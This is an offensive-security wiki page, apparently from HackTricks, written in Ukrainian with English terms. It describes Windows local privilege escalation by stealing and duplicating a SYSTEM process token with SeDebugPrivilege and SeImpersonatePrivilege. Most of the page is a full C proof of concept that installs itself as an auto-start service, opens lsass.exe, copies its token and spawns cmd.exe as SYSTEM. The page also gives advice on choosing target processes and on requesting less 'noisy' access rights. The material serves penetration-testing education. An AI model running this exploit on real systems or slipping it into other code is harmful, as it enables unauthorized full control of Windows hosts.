# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка описує варіант **manual token-theft**, де контекст **High Integrity**, який уже має **`SeDebugPrivilege`** і **`SeImpersonatePrivilege`**, відкриває відповідний процес **SYSTEM**, **duplicates its token**, і **спawns a new process** з цим токеном.

Якщо вам потрібен лише швидкий `SYSTEM` shell із привілейованого admin process, також перевірте:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Якщо у вас **немає** path для process-handle, але є **`SeImpersonatePrivilege`**, маршрут **named-pipe / Potato** зазвичай простіший:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Перш ніж пробувати token-copy path, переконайтеся, що поточний process уже перебуває в корисному контексті:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`** — це те, що дозволяє відкривати багато **не захищених** SYSTEM process навіть тоді, коли їхній DACL зазвичай блокує доступ.
- **`SeImpersonatePrivilege`** — це те, що робить **`CreateProcessWithTokenW`** практичним після цього.
- Якщо шлях копіювання token дає лише слабкий або filtered SYSTEM token, просто вкради token з **іншого SYSTEM process**.

## Обирай target process уважно

Цю technique зазвичай показують проти **`lsass.exe`**, але на modern Windows це часто **неправильний target**:

- Якщо увімкнено **LSA Protection / RunAsPPL**, **`lsass.exe`** захищений, і звичайний admin process з `SeDebugPrivilege` усе одно не зможе його відкрити.
- Краще використовувати **non-PPL SYSTEM processes** такі як **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** або ранній екземпляр **`svchost.exe`**.
- **Protected processes** і деякі спеціальні process, такі як **`System`** або **`csrss.exe`**, не є реалістичними user-mode target для цієї technique.
- Використовуй **Process Hacker / Process Explorer**, запущені elevated, щоб перевірити, чи має target token потрібні привілеї, перш ніж дублювати його.

## API details, які мають значення на практиці

Багато public PoC запитують **`PROCESS_ALL_ACCESS`** і **`TOKEN_ALL_ACCESS`**, але це шумніше, ніж потрібно. На практиці:

- Відкривай target process лише з правами, які тобі потрібні (зазвичай **`PROCESS_QUERY_INFORMATION`** або **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Відкривай token з правами, потрібними для створення process: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Використовуй **`DuplicateTokenEx(..., TokenPrimary, ...)`**, щоб створити **primary token**; одного impersonation token недостатньо для створення нового process.
- Якщо **`CreateProcessWithTokenW`** завершується помилкою **`1314`**, переходь на **`CreateProcessAsUserW`**.
- Якщо запускаєш із **service / Session 0**, пам’ятай, що **`CreateProcessWithTokenW`** залишає child у **session** викликача. Якщо тобі потрібен видимий desktop shell, використовуй **`CreateProcessAsUserW`** і перемісти token у потрібну session.

Мінімальний modern flow виглядає так:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Наступний код **експлуатує привілеї `SeDebugPrivilege` і `SeImpersonatePrivilege`** для копіювання token з **process, що працює як SYSTEM** і має **всі token privileges**. У цьому випадку код можна скомпілювати й використати як **Windows service binary** для перевірки, що primitive працює.

Основна частина **code, де відбувається elevation**, знаходиться всередині функції **`Exploit`**. Усередині цієї функції видно, що виконується пошук **`lsass.exe`**, його **token копіюється**, і зрештою цей token використовується, щоб запустити новий **`cmd.exe`** з усіма привілеями скопійованого token.

На сучасних hosts часто потрібно замінити **`lsass.exe`** на інший **non-PPL SYSTEM process**, наприклад **`winlogon.exe`**, **`wininit.exe`** або **`services.exe`**.

Інші process, що працюють як SYSTEM з усіма або більшістю token privileges: **`services.exe`**, **`svchost.exe`** (деякі з перших), **`wininit.exe`**, **`csrss.exe`**... Пам’ятайте, що зазвичай ви **не зможете скопіювати token із protected process**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Посилання

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
